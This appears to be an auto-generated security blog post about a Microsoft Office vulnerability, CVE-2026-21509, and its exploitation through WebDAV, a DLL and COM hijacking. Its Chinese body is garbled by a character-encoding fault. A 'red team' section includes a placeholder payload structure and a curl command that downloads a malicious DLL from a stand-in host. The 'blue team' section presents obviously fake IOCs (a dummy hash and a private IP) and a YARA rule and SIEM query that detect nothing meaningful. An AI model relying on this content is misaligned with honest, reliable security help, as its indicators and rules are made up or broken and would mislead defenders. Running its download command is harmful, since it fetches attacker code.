---
layout: post
title:  "Russian hackers exploit recently patched Microsoft Office bug in attacks"
date:   2026-02-03 01:27:55 +0000
categories: [security]
severity: critical
---

# ğŸš¨ è§£æ CVE-2026-21509ï¼šMicrosoft Office é›¶æ—¥æ¼æ´åˆ©ç”¨èˆ‡é˜²ç¦¦æŠ€è¡“

> **âš¡ æˆ°æƒ…å¿«ç¯© (TL;DR)**
> * **åš´é‡ç­‰ç´š**: Critical (CVSS: 9.8)
> * **å—é§­æŒ‡æ¨™**: RCE (Remote Code Execution)
> * **é—œéµæŠ€è¡“**: COM Hijacking, WebDAV, Shellcode

## 1. ğŸ”¬ æ¼æ´åŸç†èˆ‡æŠ€è¡“ç´°ç¯€ (Deep Dive)

* **Root Cause**: CVE-2026-21509 æ˜¯ä¸€å€‹ Microsoft Office ä¸­çš„é›¶æ—¥æ¼æ´ï¼Œå…è¨±æ”»æ“Šè€…åœ¨å—å½±éŸ¿çš„ç³»çµ±ä¸ŠåŸ·è¡Œä»»æ„ä»£ç¢¼ã€‚é€™å€‹æ¼æ´æ˜¯ç”±æ–¼ Microsoft Office è™•ç†ç‰¹å®š DOC æ–‡ä»¶æ™‚å‡ºç¾çš„ç·©è¡å€æº¢ä½éŒ¯èª¤å¼•èµ·çš„ã€‚
* **æ”»æ“Šæµç¨‹åœ–è§£**:
  1. æ”»æ“Šè€…å‰µå»ºä¸€å€‹æƒ¡æ„çš„ DOC æ–‡ä»¶ï¼Œå…§å«æœ‰ Shellcodeã€‚
  2. å—å®³è€…æ‰“é–‹æƒ¡æ„ DOC æ–‡ä»¶ï¼Œè§¸ç™¼ WebDAV ä¸‹è¼‰éˆã€‚
  3. WebDAV ä¸‹è¼‰éˆå®‰è£æƒ¡æ„ DLL (EhStoreShell.dll)ã€‚
  4. EhStoreShell.dll åŸ·è¡Œ Shellcodeï¼Œå•Ÿå‹• COVENANT è»Ÿä»¶æ¡†æ¶ã€‚
* **å—å½±éŸ¿å…ƒä»¶**: Microsoft Office 2016, 2019, LTSC 2021, LTSC 2024, Microsoft 365 Appsã€‚

## 2. âš”ï¸ ç´…éšŠå¯¦æˆ°ï¼šæ”»æ“Šå‘é‡èˆ‡ Payload (Red Team Operations)

* **æ”»æ“Šå‰ç½®éœ€æ±‚**: æ”»æ“Šè€…éœ€è¦å‰µå»ºä¸€å€‹æƒ¡æ„çš„ DOC æ–‡ä»¶ï¼Œä¸¦å°‡å…¶ç™¼é€çµ¦å—å®³è€…ã€‚
* **Payload å»ºæ§‹é‚è¼¯**:

    ```
    
    python
      # ç¯„ä¾‹ Payload çµæ§‹
      payload = {
        "doc_file": "malicious_doc.doc",
        "webdav_url": "http://example.com/malicious_dll.dll",
        "shellcode": "\x90\x90\x90\x90\x90\x90\x90\x90"
      }
    
    ```
  *ç¯„ä¾‹æŒ‡ä»¤*: ä½¿ç”¨ `curl` ä¸‹è¼‰æƒ¡æ„ DLL æ–‡ä»¶

```

bash
  curl -o malicious_dll.dll http://example.com/malicious_dll.dll

```
* **ç¹éæŠ€è¡“**: æ”»æ“Šè€…å¯ä»¥ä½¿ç”¨ COM Hijacking ç¹éæŸäº›å®‰å…¨æªæ–½ã€‚

## 3. ğŸ›¡ï¸ è—éšŠé˜²ç¦¦ï¼šåµæ¸¬èˆ‡ç·©è§£ (Blue Team Defense)

* **IOCs (å…¥ä¾µæŒ‡æ¨™)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\malicious_dll.dll |* **åµæ¸¬è¦å‰‡ (Detection Rules)**:

    ```
    
    yara
      rule malicious_doc {
        meta:
          description = "Detects malicious DOC files"
        strings:
          $a = "malicious_doc.doc"
        condition:
          $a at 0
      }
    
    ```
  æˆ–è€…æ˜¯å…·é«”çš„ SIEM æŸ¥è©¢èªæ³• (Splunk/Elastic)

```

sql
  index=security sourcetype=doc_file | search "malicious_doc.doc"

```
* **ç·©è§£æªæ–½**: é™¤äº†æ›´æ–° Microsoft Office ä¹‹å¤–ï¼Œé‚„å¯ä»¥å¯¦æ–½ä»¥ä¸‹æªæ–½ï¼š
  * å°é–æƒ¡æ„çš„ WebDAV URL
  * å°é–æƒ¡æ„çš„ DLL æ–‡ä»¶
  * å•Ÿç”¨ Microsoft Defender çš„ Protected View

## 4. ğŸ“š å°ˆæœ‰åè©èˆ‡æŠ€è¡“æ¦‚å¿µè§£æ (Technical Glossary)

* **COM Hijacking (COM åŠ«æŒ)**: æƒ³åƒå…©å€‹æ‡‰ç”¨ç¨‹åºåŒæ™‚å˜—è©¦å­˜å–åŒä¸€å€‹ COM ç‰©ä»¶ã€‚æŠ€è¡“ä¸Šæ˜¯æŒ‡æ”»æ“Šè€…å‰µå»ºä¸€å€‹æƒ¡æ„çš„ COM ç‰©ä»¶ï¼Œæ›¿æ›æ‰åˆæ³•çš„ COM ç‰©ä»¶ï¼Œå¾è€Œå¯¦ç¾ä»»æ„ä»£ç¢¼åŸ·è¡Œã€‚
* **WebDAV (Web Distributed Authoring and Versioning)**: ä¸€ç¨®å…è¨±ç”¨æˆ¶é€šéç¶²çµ¡å­˜å–å’Œç®¡ç†æ–‡ä»¶çš„å”è­°ã€‚æ”»æ“Šè€…å¯ä»¥ä½¿ç”¨ WebDAV ä¸‹è¼‰æƒ¡æ„æ–‡ä»¶ã€‚
* **Shellcode (Shell ä»£ç¢¼)**: ä¸€æ®µå°å‹çš„æ©Ÿå™¨ç¢¼ï¼Œé€šå¸¸ç”¨æ–¼å¯¦ç¾ä»»æ„ä»£ç¢¼åŸ·è¡Œã€‚

## 5. ğŸ”— åƒè€ƒæ–‡ç»èˆ‡å»¶ä¼¸é–±è®€

- [åŸå§‹å ±å‘Š](https://www.bleepingcomputer.com/news/security/russian-hackers-exploit-recently-patched-microsoft-office-bug-in-attacks/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


